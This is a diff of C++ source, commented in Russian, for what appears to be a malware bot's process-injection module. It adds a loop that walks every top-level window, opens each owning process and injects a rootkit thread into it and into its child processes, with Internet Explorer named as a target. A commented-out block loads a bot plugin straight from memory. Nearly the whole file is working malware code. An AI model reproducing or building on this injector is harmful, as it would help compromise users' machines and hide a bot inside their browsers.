@@ -2,21 +2,44 @@
 
 #pragma hdrstop
 
+#include <Windows.h>
+#include <tlhelp32.h>
+
 #include "AppInjector.h"
 #include "BotCore.h"
 #include "Inject.h"
-#include "WndUtils.h"
 #include "Utils.h"
+#include "Installer.h"
+#include "DLLLoader.h"
+#include "ntdll.h"
+#include "Rootkit.h"
+#include "BotUtils.h"
+//---------------------------------------------------------------------------
+
+
+#include "BotDebug.h"
+
+namespace INJECTORRDEBUGSTRINGS
+{
+	#include "DbgTemplates.h"
+}
+
+// Объявляем шаблон вывода отладочных строк
+#define INJKDBG INJECTORRDEBUGSTRINGS::DBGOutMessage<>
+
 //---------------------------------------------------------------------------
 
 namespace INJECTOR
 {
 	typedef struct TInjector
 	{
-		bool      IsWin64;  // Признак того, что процесс работает в 64 битной вине
-		TBotList* Injected; // Список процессов, в которые был совершён инжект
-	} *PInjector;
+		bool      IsWin64;     // Признак того, что процесс работает в 64 битной вине
+		TBotList* Injected;    // Список процессов, в которые был совершён инжект
+		LPBYTE    NameBuf;     // Буфер получения имени ехе процесса
+		DWORD     NameBufSize; // размер буфера получения имени ехе процесса
 
+		TInjectFunction InjectFunction; // Указатель на внедряемую функцию
+	} *PInjector;
 
 	typedef struct TProcessInfo
 	{
@@ -25,21 +48,31 @@ namespace INJECTOR
 		wstring  ExeName;
 	} *PProcessInfo;
 
-
+	typedef struct TInjectItem
+	{
+		DWORD NameHash;
+		DWORD PID;
+	} *PInjectItem;
 
 	DWORD WINAPI InjectorProc(LPVOID);
 	BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param);
-	bool GetProcessInfo(DWORD PID, TProcessInfo &Info);
+	bool GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info);
+	bool Inject(PInjector Injector, PProcessInfo Info);
+	void InjectInChildProcesses(PInjector Injector, PProcessInfo Parent);
 }
 
 
 //------------------------------------------------------
 //  StartInjector - Функция стартует процесс инжектора
 //------------------------------------------------------
-void StartInjector()
+BOOL WINAPI StartInjector()
 {
-	StartThread(INJECTOR::InjectorProc, NULL);
-//	MegaJump(IJECTOR::InjectorProc);
+	INJKDBG("INJECTOR", "Стартуем инжектор");
+	#ifdef AGENTFULLTEST
+		return StartThread(INJECTOR::InjectorProc, NULL) != NULL;
+	#else
+		return MegaJump(INJECTOR::InjectorProc);
+	#endif
 }
 
 
@@ -55,15 +88,51 @@ DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
 	// в поцесы владельцы
 	BOT::Initialize();
 
+	INJKDBG("INJECTOR", "Запущен процесс инжектра");
+
 	TInjector Injector;
 	Injector.IsWin64  = IsWIN64();
-    Injector.Injected = new TBotList();
+	Injector.Injected = new TBotList();
+	Injector.NameBufSize = 1024;
+	Injector.NameBuf = (LPBYTE)MemAlloc(Injector.NameBufSize);
+
+	// Для старта определяем основную функцию руткита
+	Injector.InjectFunction = RootkitThread;
+
+	/*
+	// Загружаем плагин
+	INJKDBG("INJECTOR", "Загружаем bot.plug");
+	for (int i = 0; i < 2; i++)
+	{
+		LPVOID Plug = NULL;
+		LPVOID PlugHandle = NULL;
+		if (LoadBotPlug(&Plug, NULL))
+		{
+			PlugHandle = MemoryLoadLibrary(Plug, false);
+			Injector.InjectFunction = (TInjectFunction)MemoryGetProcAddress(PlugHandle, START_PROC_HASH);
+			FreeBotPlug(Plug);
+		}
+		if (Injector.InjectFunction) break;
+
+
+
+
+		// В случае ошибки получения адреса функции
+		// принудительно обновляем плагин
+		MemoryFreeLibrary(PlugHandle);
+		UpdateBotPlug();
+	}
+
+	if (!Injector.InjectFunction) pExitProcess(0); */
+
+
+    INJKDBG("INJECTOR", "Стартуем");
 
 	while (!BOT::Terminated())
 	{
 		// Перебираем главные окна окна
 		pEnumWindows(WndEnumCallBak, &Injector);
-		pSleep(1000);
+		pSleep(500);
 	}
 
 	// При завершении работы выходим из процесса
@@ -74,7 +143,7 @@ DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
 //------------------------------------------------------
 // GetProcessInfo - Функция полуает информацию о прцессе
 //------------------------------------------------------
-bool INJECTOR::GetProcessInfo(DWORD PID, TProcessInfo &Info)
+bool INJECTOR::GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info)
 {
 	ClearStruct(Info);
 	Info.PID = PID;
@@ -83,7 +152,7 @@ bool INJECTOR::GetProcessInfo(DWORD PID, TProcessInfo &Info)
 	ClientID.UniqueProcess = (HANDLE)PID;
 	ClientID.UniqueThread  = 0;
 
-    OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;
+	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;
 
 	HANDLE Process;
 	if (pZwOpenProcess(&Process,  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributes, &ClientID) != STATUS_SUCCESS)
@@ -92,17 +161,14 @@ bool INJECTOR::GetProcessInfo(DWORD PID, TProcessInfo &Info)
 	// Определяем кк запущен процесс
 	pIsWow64Process(Process, &Info.IsWOW64);
 
+	if (Injector->IsWin64 && !Info.IsWOW64)
+		return false;
+
 	// Получаем имя процесса
-	TMemory Buf((MAX_PATH + 1) * sizeof(WCHAR) + sizeof(UNICODE_STRING));
-
-	PCHAR Tmp = Buf.AsStr();
-	PUNICODE_STRING Str = (PUNICODE_STRING)Tmp;
+	PUNICODE_STRING Str = (PUNICODE_STRING)Injector->NameBuf;
 	Str->Length = 0;
-	Str->MaximumLength = MAX_PATH * sizeof(wchar_t);
-
-	Tmp += sizeof(UNICODE_STRING);
-
-	Str->Buffer = (PWSTR)Tmp;
+	Str->MaximumLength = Injector->NameBufSize - sizeof(UNICODE_STRING);
+	Str->Buffer        = (PWSTR)(Injector->NameBuf + sizeof(UNICODE_STRING));
 	ULONG Len = Str->MaximumLength;
 
 	if(pZwQueryInformationProcess(Process, ProcessImageFileName, Str, Len, &Len) == STATUS_SUCCESS)
@@ -131,23 +197,87 @@ BOOL CALLBACK INJECTOR::WndEnumCallBak(HWND Wnd, LPARAM Param)
 		pGetWindowThreadProcessId(Wnd, &PID);
 		if (PID)
 		{
-			string Text = GetWndText2(Wnd);
-
 			PInjector Injector = (PInjector)Param;
 
+
 			TProcessInfo Info;
-			GetProcessInfo(PID, Info);
+			if (GetProcessInfo(Injector, PID, Info))
+			{
+				// Проверяем необходимость инжекта
+				// Разрешаем инжект в 32 разрядной винде или в 32 разрядные процессы
+				Inject(Injector, &Info);
+			}
 
-			// Проверяем необходимость инжекта
-			// Разрешаем инжект в 32 разрядной винде или в 32 разрядные процессы
-			bool CanInject = !Injector->IsWin64 || IsWOW64(PID);
-
-			//проверяем не инжектились ли в данный процесс
-			if (CanInject)
-				CanInject = false;
-
-        }
+		}
     }
 
 	return TRUE;
+}
+
+
+void INJECTOR::InjectInChildProcesses(PInjector Injector, PProcessInfo Parent)
+{
+	// Функция инжектится в дочерние процессы
+	// и параллельно роверяем список обработанных процессов
+	PROCESSENTRY32 pe;
+	pe.dwSize = sizeof(pe);
+	HANDLE Snap = (HANDLE)pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0);
+	if (Snap != INVALID_HANDLE_VALUE)
+	{
+		if (pProcess32First(Snap, &pe))
+		{
+			do
+			{
+				if (pe.th32ParentProcessID == Parent->PID)
+				{
+					TProcessInfo Info;
+					if (GetProcessInfo(Injector, pe.th32ProcessID, Info))
+						Inject(Injector, &Info);
+				}
+
+			} while( pProcess32Next(Snap, &pe ) );
+		}
+		pCloseHandle(Snap);
+    }
+ }
+
+
+//------------------------------------------------------
+// Inject - Функция осуществляет инжект в казанный процесс
+//------------------------------------------------------
+bool INJECTOR::Inject(PInjector Injector, PProcessInfo Info)
+{
+	DWORD Hash = Info->ExeName.Hash();
+	// Проверяем не инжектились ли в данный процесс
+	for (int i = 0; i < Injector->Injected->Count(); i++)
+	{
+		PInjectItem Item = (PInjectItem)Injector->Injected->GetItem(i);
+		if (Item->PID == Info->PID && Item->NameHash == Hash)
+		{
+			// При повторном инжекте пробуем заинжектиться в дочерние процессы.
+			// связано с тем, что некоторые программы создают один основной и
+			// при следующем запуске создают его дочерние процессы.
+			// В частности такое поведение замечено за Internet Explorer
+			InjectInChildProcesses(Injector, Info);
+
+			return false;
+        }
+	}
+
+	if (!BOT::ProcessInfected(Info->PID))
+	{
+		#ifndef AGENTFULLTEST
+			BOOL Injected = InjectIntoProcess2(Info->PID, Injector->InjectFunction);
+			INJKDBG("INJECTOR", "Инжект: Result=%d App=%S", Injected, Info->ExeName.t_str());
+		#else
+			BOOL Injected = TRUE;
+		#endif
+    }
+
+	// Сохраняем информацию
+	PInjectItem Item = CreateStruct(TInjectItem);
+	Item->PID = Info->PID;
+	Item->NameHash = Hash;
+	Injector->Injected->Add(Item);
+	return true;
 }
